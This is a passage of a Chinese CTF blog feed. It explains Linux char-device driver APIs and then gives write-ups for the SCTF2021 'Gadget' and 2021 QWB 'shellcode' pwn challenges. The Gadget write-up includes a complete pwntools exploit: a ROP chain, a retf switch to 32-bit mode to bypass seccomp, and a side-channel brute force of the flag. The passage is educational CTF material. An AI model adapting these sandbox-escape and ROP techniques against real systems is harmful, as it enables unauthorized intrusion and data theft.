结构体的指针，表示要注册的字符设备。</li><li><code>dev</code>：字符设备的设备号，包括主设备号和次设备号。</li><li><code>count</code>：设备的数量。通常为1，表示一个设备。</li></ul><p>对应的逆操作函数是<strong>cdev_del</strong></p><h4 id="class-create"><a href="#class-create" class="headerlink" title="_class_create"></a>_class_create</h4><p><code>_class_create</code> 函数是Linux内核中的一个函数，用于创建一个设备类（<code>struct class</code>）,并返回指向 <code>struct class</code> 结构体的指针。设备类是用于组织和管理设备的结构，它提供了一种将相关设备分组的机制，使得用户空间应用程序更容易识别和管理这些设备。</p><p>对应的逆操作函数是<strong>class_destroy</strong></p><h4 id="device-create"><a href="#device-create" class="headerlink" title="device_create"></a>device_create</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> device *<span class="title function_">device_create</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> class *class, <span class="keyword">struct</span> device *parent,</span></span><br><span class="line"><span class="params">     <span class="type">dev_t</span> devt, <span class="type">void</span> *drvdata, <span class="type">const</span> <span class="type">char</span> *fmt, ...)</span></span><br><span class="line">&#123;</span><br><span class="line">va_list vargs;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">dev</span>;</span></span><br><span class="line"></span><br><span class="line">va_start(vargs, fmt);</span><br><span class="line">dev = device_create_groups_vargs(class, parent, devt, drvdata, <span class="literal">NULL</span>,</span><br><span class="line">  fmt, vargs);</span><br><span class="line">va_end(vargs);</span><br><span class="line"><span class="keyword">return</span> dev;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL_GPL(device_create)</span><br></pre></td></tr></table></figure><p><code>device_create</code> 函数是 Linux 内核中用于创建字符设备节点（<u>设备文件</u>）的函数。这个函数通常与 <code>class_create</code> 配合使用，用于将字符设备注册到设备类并在 <code>/dev</code> 目录下创建相应的设备节点。</p><p>参数说明：</p><ul><li><code>class</code>：指向 <code>struct class</code> 结构体的指针，表示设备类。</li><li><code>parent</code>：父设备的指针，可以是 <code>NULL</code>。</li><li><code>devt</code>：设备号，包括主设备号和次设备号。</li><li><code>drvdata</code>：指向要关联到设备的私有数据的指针，通常为 <code>NULL</code>。</li><li><code>fmt</code>：用于创建设备节点的格式字符串。</li><li><code>...</code>：用于填充 <code>fmt</code> 字符串中的占位符。</li></ul><p><code>device_create</code> 的主要作用是创建一个字符设备节点，并将其注册到设备类中。通过这个函数，用户空间应用程序可以访问 <code>/dev</code> 目录下的设备节点，以与驱动程序通信。</p><p>对应的逆操作函数是<strong>device_destroy</strong></p><hr><p>看一下两个关键的结构体</p><p><strong>file_operations</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">module</span> *<span class="title">owner</span>;</span></span><br><span class="line"><span class="type">loff_t</span> (*llseek) (<span class="keyword">struct</span> file *, <span class="type">loff_t</span>, <span class="type">int</span>);</span><br><span class="line"><span class="type">ssize_t</span> (*read) (<span class="keyword">struct</span> file *, <span class="type">char</span> __user *, <span class="type">size_t</span>, <span class="type">loff_t</span> *);</span><br><span class="line"><span class="type">ssize_t</span> (*write) (<span class="keyword">struct</span> file *, <span class="type">const</span> <span class="type">char</span> __user *, <span class="type">size_t</span>, <span class="type">loff_t</span> *);</span><br><span class="line"><span class="type">ssize_t</span> (*read_iter) (<span class="keyword">struct</span> kiocb *, <span class="keyword">struct</span> iov_iter *);</span><br><span class="line"><span class="type">ssize_t</span> (*write_iter) (<span class="keyword">struct</span> kiocb *, <span class="keyword">struct</span> iov_iter *);</span><br><span class="line"><span class="type">int</span> (*iopoll)(<span class="keyword">struct</span> kiocb *kiocb, <span class="keyword">struct</span> io_comp_batch *,</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> flags);</span><br><span class="line"><span class="type">int</span> (*iterate_shared) (<span class="keyword">struct</span> file *, <span class="keyword">struct</span> dir_context *);</span><br><span class="line"><span class="type">__poll_t</span> (*poll) (<span class="keyword">struct</span> file *, <span class="keyword">struct</span> poll_table_struct *);</span><br><span class="line"><span class="type">long</span> (*unlocked_ioctl) (<span class="keyword">struct</span> file *, <span class="type">unsigned</span> <span class="type">int</span>, <span class="type">unsigned</span> <span class="type">long</span>);</span><br><span class="line"><span class="type">long</span> (*compat_ioctl) (<span class="keyword">struct</span> file *, <span class="type">unsigned</span> <span class="type">int</span>, <span class="type">unsigned</span> <span class="type">long</span>);</span><br><span class="line"><span class="type">int</span> (*mmap) (<span class="keyword">struct</span> file *, <span class="keyword">struct</span> vm_area_struct *);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> mmap_supported_flags;</span><br><span class="line"><span class="type">int</span> (*open) (<span class="keyword">struct</span> inode *, <span class="keyword">struct</span> file *);</span><br><span class="line"><span class="type">int</span> (*flush) (<span class="keyword">struct</span> file *, <span class="type">fl_owner_t</span> id);</span><br><span class="line"><span class="type">int</span> (*release) (<span class="keyword">struct</span> inode *, <span class="keyword">struct</span> file *);</span><br><span class="line"><span class="type">int</span> (*fsync) (<span class="keyword">struct</span> file *, <span class="type">loff_t</span>, <span class="type">loff_t</span>, <span class="type">int</span> datasync);</span><br><span class="line"><span class="type">int</span> (*fasync) (<span class="type">int</span>, <span class="keyword">struct</span> file *, <span class="type">int</span>);</span><br><span class="line"><span class="type">int</span> (*lock) (<span class="keyword">struct</span> file *, <span class="type">int</span>, <span class="keyword">struct</span> file_lock *);</span><br><span class="line"><span class="type">unsigned</span> <span class="title function_">long</span> <span class="params">(*get_unmapped_area)</span><span class="params">(<span class="keyword">struct</span> file *, <span class="type">unsigned</span> <span class="type">long</span>, <span class="type">unsigned</span> <span class="type">long</span>, <span class="type">unsigned</span> <span class="type">long</span>, <span class="type">unsigned</span> <span class="type">long</span>)</span>;</span><br><span class="line"><span class="type">int</span> (*check_flags)(<span class="type">int</span>);</span><br><span class="line"><span class="type">int</span> (*flock) (<span class="keyword">struct</span> file *, <span class="type">int</span>, <span class="keyword">struct</span> file_lock *);</span><br><span class="line"><span class="type">ssize_t</span> (*splice_write)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> file *, <span class="type">loff_t</span> *, <span class="type">size_t</span>, <span class="type">unsigned</span> <span class="type">int</span>);</span><br><span class="line"><span class="type">ssize_t</span> (*splice_read)(<span class="keyword">struct</span> file *, <span class="type">loff_t</span> *, <span class="keyword">struct</span> pipe_inode_info *, <span class="type">size_t</span>, <span class="type">unsigned</span> <span class="type">int</span>);</span><br><span class="line"><span class="type">void</span> (*splice_eof)(<span class="keyword">struct</span> file *file);</span><br><span class="line"><span class="type">int</span> (*setlease)(<span class="keyword">struct</span> file *, <span class="type">int</span>, <span class="keyword">struct</span> file_lock **, <span class="type">void</span> **);</span><br><span class="line"><span class="type">long</span> (*fallocate)(<span class="keyword">struct</span> file *file, <span class="type">int</span> mode, <span class="type">loff_t</span> offset,</span><br><span class="line">  <span class="type">loff_t</span> len);</span><br><span class="line"><span class="type">void</span> (*show_fdinfo)(<span class="keyword">struct</span> seq_file *m, <span class="keyword">struct</span> file *f);</span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> CONFIG_MMU</span></span><br><span class="line"><span class="type">unsigned</span> (*mmap_capabilities)(<span class="keyword">struct</span> file *);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="type">ssize_t</span> (*copy_file_range)(<span class="keyword">struct</span> file *, <span class="type">loff_t</span>, <span class="keyword">struct</span> file *,</span><br><span class="line"><span class="type">loff_t</span>, <span class="type">size_t</span>, <span class="type">unsigned</span> <span class="type">int</span>);</span><br><span class="line"><span class="type">loff_t</span> (*remap_file_range)(<span class="keyword">struct</span> file *file_in, <span class="type">loff_t</span> pos_in,</span><br><span class="line">   <span class="keyword">struct</span> file *file_out, <span class="type">loff_t</span> pos_out,</span><br><span class="line">   <span class="type">loff_t</span> len, <span class="type">unsigned</span> <span class="type">int</span> remap_flags);</span><br><span class="line"><span class="type">int</span> (*fadvise)(<span class="keyword">struct</span> file *, <span class="type">loff_t</span>, <span class="type">loff_t</span>, <span class="type">int</span>);</span><br><span class="line"><span class="type">int</span> (*uring_cmd)(<span class="keyword">struct</span> io_uring_cmd *ioucmd, <span class="type">unsigned</span> <span class="type">int</span> issue_flags);</span><br><span class="line"><span class="type">int</span> (*uring_cmd_iopoll)(<span class="keyword">struct</span> io_uring_cmd *, <span class="keyword">struct</span> io_comp_batch *,</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> poll_flags);</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure><p>有点像proc_operations的plus版</p><p><strong>cdev</strong></p><p><code>cdev</code> 结构体是 Linux 内核中用于表示字符设备的结构体。它包含了字符设备的一些重要信息和操作函数，用于向内核注册和管理字符设备。下面是 <code>cdev</code> 结构体的定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cdev</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kobject</span> <span class="title">kobj</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">module</span> *<span class="title">owner</span>;</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line"><span class="type">dev_t</span> dev;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> count;</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure><p><code>cdev</code> 结构体的主要成员包括：</p><ol><li><strong><code>struct kobject kobj</code>：</strong> 用于实现内核对象，与 sysfs 文件系统相关，提供一种在用户空间访问设备信息的机制。</li><li><strong><code>struct module *owner</code>：</strong> 拥有该字符设备的内核模块。</li><li><strong><code>const struct file_operations *ops</code>：</strong> 与字符设备关联的文件操作结构体，包含了指向设备的操作函数指针，如 <code>open</code>、<code>read</code>、<code>write</code>、<code>release</code> 等。</li><li><strong><code>struct list_head list</code>：</strong> 用于将 <code>cdev</code> 结构体链接到其他设备结构体的链表。</li><li><strong><code>dev_t dev</code>：</strong> 字符设备的设备号，包括主设备号和次设备号。</li><li><strong><code>unsigned int count</code>：</strong> 设备号的数量，通常为 1。</li></ol><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>内核pwn其实与用户态pwn并无太大的差异</p><p>就是通过编译执行二进制程序触发加载在内核中的模块存在的漏洞</p><p>想办法完成提权,然后再返回到用户态下getshell</p>]]></content>
    
    
    <summary type="html">从两道例题初步理解内核pwn</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="kernel" scheme="https://ixout.github.io/tags/kernel/"/>
    
  </entry>
  
  <entry>
    <title>杂题录</title>
    <link href="https://ixout.github.io/posts/4584/"/>
    <id>https://ixout.github.io/posts/4584/</id>
    <published>2023-12-11T13:13:24.000Z</published>
    <updated>2024-01-01T14:34:54.871Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SCTF2021-Gadget"><a href="#SCTF2021-Gadget" class="headerlink" title="SCTF2021 Gadget"></a>SCTF2021 Gadget</h1><p><strong>标签:retf|侧信道攻击|沙盒</strong></p><p>程序是静态链接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/gadget&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0001: 0x25 0x03 0x00 0x40000000  if (A &gt; 0x40000000) goto 0005</span><br><span class="line"> 0002: 0x15 0x03 0x00 0x00000005  if (A == fstat) goto 0006</span><br><span class="line"> 0003: 0x15 0x02 0x00 0x00000000  if (A == read) goto 0006</span><br><span class="line"> 0004: 0x15 0x01 0x00 0x00000025  if (A == alarm) goto 0006</span><br><span class="line"> 0005: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0006: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br></pre></td></tr></table></figure><p>程序有seccomp只允许三个系统调用</p><p>传统的orw,因为只有<code>read</code>，<code>open</code>和<code>write</code>都被禁用而无法使用。</p><p>再回到程序本身程序读取时存在栈溢出,这是主要的漏洞点</p><p>不过可以观察到沙盒并没有限制系统的ARCH,同时fstat的系统调用号在32位中恰好是open的系统调用</p><p>搜索gadget,可以发现存在retf,retf可以用来切换32位模式(ropper搜索并没有找到这个gadget,但ROPgadget找到了,ropper也可以找到不过要用—instructions选项,因此找gadget还是要小心一点)</p><p>此时open的问题解决了,但还有一个问题,就是程序没有输出,一个可行的方案是采用侧信道的方式逐个输出</p><blockquote><p>侧信道攻击：在程序无法回显时，通过程序反馈的信息对进行flag逐位爆破。</p></blockquote><p>恰好程序中有这么一段gadget</p><p><code>cmp byte ptr [rax - 0x46], cl; push rbp; ret 0x5069;</code></p><p>和一段无限循环的代码</p><p><code>.text:0000000000405837 EB FE                         jmp     short loc_405837</code></p><p>用这两部分代码来探测是否爆破成功</p><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os = <span class="string">&quot;linux&quot;</span>, arch = <span class="string">&quot;amd64&quot;</span>)</span><br><span class="line"><span class="comment">#context(log_level = &#x27;debug&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./gadget&quot;</span>)</span><br><span class="line">possible_list = <span class="string">&quot;0123456789_abcdefghijklmnopqrstuvwxyz&#123;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">bss_addr = elf.bss() + <span class="number">0x500</span></span><br><span class="line">pop_rax_ret = <span class="number">0x401001</span></span><br><span class="line">pop_rbx_r14_r15_rbp_ret = <span class="number">0x403072</span></span><br><span class="line">pop_rcx_ret = <span class="number">0x40117b</span></span><br><span class="line">pop_rdi_rbp_ret = <span class="number">0x401734</span></span><br><span class="line">pop_rdi_jmp_rax = <span class="number">0x402be4</span></span><br><span class="line">pop_rsi_r15_rbp_ret = <span class="number">0x401732</span></span><br><span class="line">mov_rsi_r15_mov_rdx_r12_call_r14 = <span class="number">0x402c04</span> <span class="comment"># call -&gt; push + jmp</span></span><br><span class="line">pop_r12_r14_r15_rbp_ret = <span class="number">0x40172f</span></span><br><span class="line">pop_rsp_ret = <span class="number">0x409d1c</span> <span class="comment"># mov edi,...</span></span><br><span class="line">pop_rbp_ret = <span class="number">0x401102</span></span><br><span class="line">syscall_pop_rbp_ret = <span class="number">0x401165</span></span><br><span class="line">int_0x80_ret = <span class="number">0x4011f3</span></span><br><span class="line">retf_addr = <span class="number">0x4011ed</span></span><br><span class="line">cmp_addr = <span class="number">0x408266</span> <span class="comment"># cmp byte ptr [rax - 0x46], cl ; push rbp ; ret 0x5069</span></span><br><span class="line">jnz_addr = <span class="number">0x405831</span> <span class="comment"># jnz  0x405837</span></span><br><span class="line">loop = <span class="number">0x405837</span> <span class="comment"># jmp  0x405837</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>(<span class="params">index, char</span>):</span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x38</span></span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">0</span>) + p64(pop_rdi_rbp_ret) + p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">payload += p64(pop_r12_r14_r15_rbp_ret) + p64(<span class="number">0x100</span>) + p64(syscall_pop_rbp_ret) + p64(bss_addr) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(mov_rsi_r15_mov_rdx_r12_call_r14) + p64(pop_rsp_ret) + p64(bss_addr + <span class="number">8</span>)</span><br><span class="line">io.send(payload.ljust(<span class="number">0xC0</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">payload = <span class="string">b&#x27;./flag\x00\x00&#x27;</span> + p64(pop_rax_ret) + p64(<span class="number">5</span>)</span><br><span class="line">payload += p64(pop_rbx_r14_r15_rbp_ret) + p64(bss_addr) + p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">payload += p64(pop_rcx_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(retf_addr) + p32(int_0x80_ret) + p32(<span class="number">0x23</span>)</span><br><span class="line">payload += p32(retf_addr) + p32(pop_rax_ret) + p32(<span class="number">0x33</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdi_rbp_ret) + p64(<span class="number">3</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rsi_r15_rbp_ret) + p64(bss_addr + <span class="number">0x200</span>) + p64(<span class="number">0</span>)*<span class="number">2</span> + p64(syscall_pop_rbp_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rax_ret) + p64(bss_addr + <span class="number">0x200</span> + <span class="number">0x46</span> + index)</span><br><span class="line">payload += p64(pop_rcx_ret) + p64(char)</span><br><span class="line">payload += p64(pop_rbp_ret) + p64(jnz_addr)</span><br><span class="line">payload += p64(cmp_addr)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">pos = <span class="number">0</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">left, right = <span class="number">0</span>, <span class="built_in">len</span>(possible_list)-<span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> possible_list :</span><br><span class="line">io = process(<span class="string">&#x27;./gadget&#x27;</span>)</span><br><span class="line">pwn(pos, <span class="built_in">ord</span>(i))</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">io.recv(timeout = <span class="number">1</span>)</span><br><span class="line">io.close()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">flag += i</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line">io.close()</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> i == <span class="string">&#x27;&#125;&#x27;</span> :</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">pos = pos + <span class="number">1</span></span><br><span class="line">success(flag)</span><br></pre></td></tr></table></figure><p>当爆破成功时,程序就会段错误,那么调用recv时就会立即捕获到错误,以此判断成功</p><p>当爆破失败时,程序就会进入无限循环,从而自行结束开始下一次运行</p><h1 id="2021强网杯-shellcode"><a href="#2021强网杯-shellcode" class="headerlink" title="2021强网杯 shellcode"></a>2021强网杯 shellcode</h1><p><strong>标签:retf|侧信道攻击|沙盒|可见字符shellcode|SMC</strong></p><p>这一题与上一题一个套路</p><p>程序就只由一段代码构成,看来应该是手搓的elf</p><p>开启了沙盒只允许有限几个系统调用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> <span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00000005</span>  <span class="keyword">if</span> (A == fstat) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"> <span class="number">0002</span>: <span class="number">0x15</span> <span class="number">0x05</span> <span class="number">0x00</span> <span class="number">0x00000025</span>  <span class="keyword">if</span> (A == alarm) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"> <span class="number">0003</span>: <span class="number">0x15</span> <span class="number">0x03</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  <span class="keyword">if</span> (A == stat) <span class="keyword">goto</span> <span class="number">0007</span></span><br><span class="line"> <span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x03</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A == read) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"> <span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x02</span> <span class="number">0x00</span> <span class="number">0x00000009</span>  <span class="keyword">if</span> (A == mmap) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"> <span class="number">0006</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x000000e7</span>  <span class="keyword">if</span> (A == exit_group) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"> <span class="number">0007</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br><span class="line"> <span class="number">0008</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br></pre></td></tr></table></figure><p>程序执行的内容很简单</p><p>mmap分配一块rwx的内存,向其中读入数据作为shellcode运行</p><p>不过限制读入的shellcode必须要由可见字符构成,这个限制就使得很多汇编代码无法使用,包括syscall等等,可以使用smc绕过</p><p>延续上一题的思路需要使用retf,但是这题与上一题不同在于其没有bss段,所以在切换系统宽度时会出错</p><p>这时候可以自己指定地址mmap一块内存</p><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context(log_level = &#x27;debug&#x27;)</span></span><br><span class="line"></span><br><span class="line">possible_list = <span class="string">&quot;-0123456789abcdefghijklmnopqrstuvwxyz&#123;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shellcode_open_x86 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">/*fp = 